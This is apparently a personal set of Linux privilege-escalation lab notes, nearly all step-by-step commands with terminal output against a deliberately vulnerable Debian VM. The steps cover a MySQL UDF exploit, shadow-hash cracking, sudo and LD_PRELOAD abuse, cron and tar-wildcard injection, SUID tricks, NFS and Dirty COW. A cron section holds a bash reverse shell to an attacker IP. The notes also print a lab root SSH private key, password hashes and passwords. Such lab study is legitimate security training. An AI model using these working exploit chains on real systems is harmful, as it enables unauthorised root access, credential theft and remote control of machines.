# Notes for Linux PrivEsc
https://xapax.github.io/security/#post_exploitation/privilege_escalation_-_linux/
`$ id`
`uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)`

### Using the local vulnerability exploit to leverage the root access from a user level

https://www.exploit-db.com/exploits/1518
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

`$ mysql -u root`

### Execute the following commands on the MySQL shell to create a
### User Defined Function (UDF) "do_system" using our compiled exploit:

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

`mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

### Exit the MySQL prompt
`mysql> exit`

### Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`$ /tmp/rootbash -p`

```
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

### Weak File Permissions - Readable /etc/shadow

```
rootbash-4.1# ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```

```
rootbash-4.1# cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
```

### Run the password cracker program called JohnTheRipper with a rockyou.txt wordlist of choice
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (root)
password321      (user)
2g 0:00:00:41 DONE (2021-01-22 16:00) 0.04857g/s 1498p/s 1532c/s 1532C/s purple93..nene11
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```


### You can replace the string sha512crypt hash
```
root@debian:/home/user/tools/mysql-udf# mkpasswd -m sha-512 thispasssucks
$6$tXzUQ2.kd$3POWDY87nLpxw60kVRZ0ZKCEYRQSGwobxiTrSNjzCsyJRFUbAAP6MH9tluk4Kgh0H/BZH/.oqZmbzzidXDPWD1
```

`$ su root`


### Weak File Permissions -Writable /etc/passwd

```
user@debian:~/tools/mysql-udf$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
user@debian:~/tools/mysql-udf$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
statd:x:103:65534::/var/lib/nfs:/bin/false
mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false

user@debian:~/tools/mysql-udf$ openssl passwd -1 -salt new thispass123
$1$new$oVt//Z5vJpfXixLNy6fIL.
```

### Sudo - Shell Escape Sequences (Use GTFOBins)

```
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```
### This is the easiest approach to perform PrivEsc with sudo to spawn a root shell without password
### due to misconfigurations. A life lesson for a pentester/hacker always use GTFOBins as helpful
### notes to perform privesc even it has the slightest chance to exploit it so there's no need to
### memorize it unless you've practiced hard enough without even needing to look it up
```
user@debian:~/tools/mysql-udf$ sudo vim -c '!/bin/bash'

root@debian:/home/user/tools/mysql-udf# id
uid=0(root) gid=0(root) groups=0(root)
```

### Sudo - Environment Variables
```
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

### LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object
### before any others when a program is run. LD_LIBRARY_PATH provides a list
### of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c:

`$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`

### Then run any program that is labeled with NOPASSWD here's how it works

`$ sudo LD_PRELOAD=/tmp/preload.so program-name-here`


```
user@debian:~/tools/sudo$ sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2
root@debian:/home/user/tools/sudo# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user/tools/sudo# exit
exit
apache2: bad user name ${APACHE_RUN_USER}
user@debian:~/tools/sudo$ sudo LD_PRELOAD=/tmp/preload.so /usr/bin/man
```


```
user@debian:~/tools/sudo$ ldd /usr/sbin/apache2
	linux-vdso.so.1 =>  (0x00007fffe8bff000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f1941d89000)
	libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f1941b65000)
	libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f194192b000)
	libpthread.so.0 => /lib/libpthread.so.0 (0x00007f194170f000)
	libc.so.6 => /lib/libc.so.6 (0x00007f19413a3000)
	libuuid.so.1 => /lib/libuuid.so.1 (0x00007f194119e000)
	librt.so.1 => /lib/librt.so.1 (0x00007f1940f96000)
	libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f1940d5f000)
	libdl.so.2 => /lib/libdl.so.2 (0x00007f1940b5a000)
	libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f1940932000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f1942246000)
```

### Create a shared object with the same name as one of the listed libraries (libcrypt.so.1)
### using the code located at /home/user/tools/sudo/library_path.c:
`$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`

```
user@debian:~/tools/sudo$ sudo LD_LIBRARY_PATH=/tmp apache2
apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
```

### Cron Jobs - File Permissions
```
user@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

```
user@debian:~$ ls -l /etc/crontab 
-rw-r--r-- 1 root root 804 May 13  2017 /etc/crontab
user@debian:~$ locate overwrite.sh
locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 252.5 days)
/usr/local/bin/overwrite.sh
user@debian:~$ ls -l /usr/local/bin/overwrite.sh 
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
```

```
user@debian:~$ cat /usr/local/bin/overwrite.sh 
#!/bin/bash

echo `date` > /tmp/useless
```

# The victim
`user@debian:~$ nano /usr/local/bin/overwrite.sh`

```
#!/bin/bash
bash -i >& /dev/tcp/10.8.145.108/4444 0>&1
user@debian:~$ /usr/local/bin/overwrite.sh 
-bash: /usr/local/bin/overwrite.sh: Permission denied
```

# The Attacker
```
$ nc -lnvp 4444
Connection from 10.10.155.214:49314
bash: no job control in this shell
root@debian:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@debian:~# 
```

### Cron Jobs - PATH Environment Variable

Note that the PATH variable starts with /home/user which is our user's home directory.

Create a file called overwrite.sh in your home directory with the following contents:

```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:

`chmod +x /home/user/overwrite.sh`

Wait for the cron job to run (should not take longer than a minute).
Run the /tmp/rootbash command with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!

```
rm /tmp/rootbash
exit
```

### Cron Jobs - Wildcards

The victim
```
user@debian:~$ cat /usr/local/bin/compress.sh 
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
user@debian:~$ ls
myvpn.ovpn  shell.elf  tools
user@debian:~$ chmod +x shell.elf 
user@debian:~$ ./shell.elf 
user@debian:~$ touch /home/user/--checkpoint=1
user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
```

The Attacker
```
$ nc -nvlp 4444
Connection from 10.10.0.82:35603
id
uid=0(root) gid=0(root) groups=0(root)
ls
--checkpoint-action=exec=shell.elf
--checkpoint=1
myvpn.ovpn
shell.elf
tools
exit
```

### SUID / SGID Executables - Known Exploits
```
user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```

Search for Exim 4.84 in https://exploit-db.com

https://www.exploit-db.com/exploits/39535

```
$ ./cve-2016-1531.sh 
[ CVE-2016-1531 local root exploit
sh-4.1# id
uid=0(root) gid=1000(user) groups=0(root)
```

### SUID / SGID Executables - Shared Object Injection

The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:

`/usr/local/bin/suid-so`

Run strace on the file and search the output for open/access calls and for "no such file" errors:

`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

Create the .config directory for the libcalc.so file:

`mkdir /home/user/.config`

Example shared object code can be found at /home/user/tools/suid/libcalc.c.
It simply spawns a Bash shell. Compile the code into a shared object at
the location the suid-so executable was looking for it:

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`

Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.

`/usr/local/bin/suid-so`

### SUID / SGID Executables - Environment Variables

The /usr/local/bin/suid-env executable can be exploited due to it inheriting the
user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:

`$ /usr/local/bin/suid-env`

```
$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```
One line ("service apache2 start") suggests that the service executable is being
called to start the webserver, however the full path of the executable
(/usr/sbin/service) is not being used.

Compile the code located at /home/user/tools/suid/service.c into an executable
called service. This code simply spawns a Bash shell:

`$ gcc -o service /home/user/tools/suid/service.c`

Prepend the current directory (or where the new service executable is located)
to the PATH variable, and run the suid-env executable to gain a root shell:
`$ PATH=.:$PATH /usr/local/bin/suid-env`

### SUID / SGID Executables - Abusing Shell Features (#1)

The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env` except
that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:

`$ strings /usr/local/bin/suid-env2`

In Bash versions <4.2-048 it is possible to define shell functions with names that
resemble file paths, then export those functions so that they are used instead of any
actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:
```
$ /bin/bash --version
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

Create a Bash function with the name "/usr/sbin/service" that executes
a new Bash shell (using -p so permissions are preserved) and export the function:

```
$ function /usr/sbin/service { /bin/bash -p; }
$ export -f /usr/sbin/service
```

Run the suid-env2 executable to gain a root shell:
```
$ /usr/local/bin/suid-env2
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

### SUID / SGID Executables - Abusing Shell Features (#2)
Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable PS4 to
display an extra prompt for debugging statements.

Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and
the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

`$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

```
$ /tmp/rootbash -p
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

### Passwords & Keys - History Files

If a user accidentally types their password on the command line
instead of into a password prompt, it may get recorded in a history file.

View the contents of all the hidden history files in the user's home directory:

`$ cat ~/.*history | less`

mysql -h somehost.local -uroot -ppassword123

Note that the user has tried to connect to a MySQL server at some point,
using the "root" username and a password submitted via the command line.
Note that there is no space between the -p option and the password!

Switch to the root user, using the password:

`$ su root`
Password:password123

### Passwords & Keys - Config Files

onfig files often contain passwords in plaintext or other reversible formats.

List the contents of the user's home directory:

```
$ ls /home/user
myvpn.ovpn  service  tools
```

Note the presence of a myvpn.ovpn config file. View the contents of the file:
```
$ cat /home/user/myvpn.ovpn
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0
$ cat /etc/openvpn/auth.txt
root
password123
```


### Passwords & Keys - SSH Keys

Sometimes users make backups of important files but fail to secure them with the correct permissions.

Look for hidden files & directories in the system root:

```
$ ls -la /
total 96
drwxr-xr-x 22 root root  4096 Aug 25  2019 .
drwxr-xr-x 22 root root  4096 Aug 25  2019 ..
drwxr-xr-x  2 root root  4096 Aug 25  2019 bin
drwxr-xr-x  3 root root  4096 May 12  2017 boot
drwxr-xr-x 12 root root  2820 Jan 23 12:43 dev
drwxr-xr-x 67 root root  4096 Jan 23 13:10 etc
drwxr-xr-x  3 root root  4096 May 15  2017 home
lrwxrwxrwx  1 root root    30 May 12  2017 initrd.img -> boot/initrd.img-2.6.32-5-amd64
drwxr-xr-x 12 root root 12288 May 14  2017 lib
lrwxrwxrwx  1 root root     4 May 12  2017 lib64 -> /lib
drwx------  2 root root 16384 May 12  2017 lost+found
drwxr-xr-x  3 root root  4096 May 12  2017 media
drwxr-xr-x  2 root root  4096 Jun 11  2014 mnt
drwxr-xr-x  2 root root  4096 May 12  2017 opt
dr-xr-xr-x 96 root root     0 Jan 23 12:42 proc
drwx------  5 root root  4096 May 15  2020 root
drwxr-xr-x  2 root root  4096 May 13  2017 sbin
drwxr-xr-x  2 root root  4096 Jul 21  2010 selinux
drwxr-xr-x  2 root root  4096 May 12  2017 srv
drwxr-xr-x  2 root root  4096 Aug 25  2019 .ssh
drwxr-xr-x 13 root root     0 Jan 23 12:42 sys
drwxrwxrwt  2 root root  4096 Jan 23 13:29 tmp
drwxr-xr-x 11 root root  4096 May 13  2017 usr
drwxr-xr-x 14 root root  4096 May 13  2017 var
lrwxrwxrwx  1 root root    27 May 12  2017 vmlinuz -> boot/vmlinuz-2.6.32-5-amd64
```

```
$ ls -l /.ssh
total 4
-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key
```

Note that there is a world-readable file called `root_key`. Further inspection of this
file should indicate it is a private SSH key. The name of the file suggests it is for the root user.

Copy the key over to your Kali box (it's easier to just view the contents of the
root_key file and copy/paste the key) and give it the correct permissions, otherwise
your SSH client will refuse to use it:

```
$ cat root_key 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
-----END RSA PRIVATE KEY-----
```

Copy the contents and save it in your machine (as the attacker)

```
$ chmod 600 root_key
$ ssh -i root_key root@Victim_IP
```

Mine is 10.10.0.82 as an example
```
$ ssh -i root_key root@10.10.0.82
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2
root@debian:~#
```

### NFS

Files created via NFS inherit the remote user's ID. If the user is root,
and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

```
user@debian:~$ cat /etc/exports 
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)
```

Note that the /tmp share has root squashing disabled.

On your PentestOS box, switch to your root user if you are not already running as root:
```
# mkdir /tmp/nfs
# mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
Created symlink /run/systemd/system/remote-fs.target.wants/rpc-statd.service → /usr/lib/systemd/system/rpc-statd.service.
```

Still using PentestOS's root user, generate a payload using msfvenom and save
it to the mounted share (this payload simply calls /bin/bash):

`# msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`

Still using PentestOS's root user, make the file executable and set the SUID permission:

`# chmod +xs /tmp/nfs/shell.elf`

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
```
user@debian:~$ /tmp/shell.elf 
bash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# 
```

What is the name of the option that disables root squashing?
Answer: "no_root_squash"

### Kernel Exploits

Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.

Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:

```
user@debian:~$ perl linux-exploit-suggester-2.pl

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 2.6.32
  Searching 72 exploits...

  Possible Exploits
  [1] american-sign-language
      CVE-2010-4347
      Source: http://www.securityfocus.com/bid/45408
  [2] can_bcm
      CVE-2010-2959
      Source: http://www.exploit-db.com/exploits/14814
  [3] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [4] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [5] half_nelson1
      Alt: econet       CVE-2010-3848
      Source: http://www.exploit-db.com/exploits/17787
  [6] half_nelson2
      Alt: econet       CVE-2010-3850
      Source: http://www.exploit-db.com/exploits/17787
  [7] half_nelson3
      Alt: econet       CVE-2010-4073
      Source: http://www.exploit-db.com/exploits/17787
  [8] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [9] pktcdvd
      CVE-2010-3437
      Source: http://www.exploit-db.com/exploits/15150
  [10] ptrace_kmod2
      Alt: ia32syscall,robert_you_suck       CVE-2010-3301
      Source: http://www.exploit-db.com/exploits/15023
  [11] rawmodePTY
      CVE-2014-0196
      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
  [12] rds
      CVE-2010-3904
      Source: http://www.exploit-db.com/exploits/15285
  [13] reiserfs
      CVE-2010-1146
      Source: http://www.exploit-db.com/exploits/12130
  [14] video4linux
      CVE-2010-3081
      Source: http://www.exploit-db.com/exploits/15024
```

The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for
Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c.
It replaces the SUID file /usr/bin/passwd with one that spawns
a shell (a backup of /usr/bin/passwd is made at /tmp/bak).

Compile the code and run it (note that it may take several minutes to complete):

```
user@debian:~$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
user@debian:~$ ./c0w
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 22354000

madvise 0

ptrace 0
```

Once the exploit completes, run `/usr/bin/passwd` to gain a root shell:

```
user@debian:~$ /usr/bin/passwd
user@debian:~# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

Tools:
[1] linux-exploit-suggester -> https://github.com/jondonas/linux-exploit-suggester-2 (Written in perl but better) && https://github.com/mzet-/linux-exploit-suggester (The original)
[2] LinEnum -> https://github.com/rebootuser/LinEnum
[3] PEASS -> https://github.com/carlospolop/PEASS-ng
[4] Bashark -> https://github.com/redcode-labs/Bashark
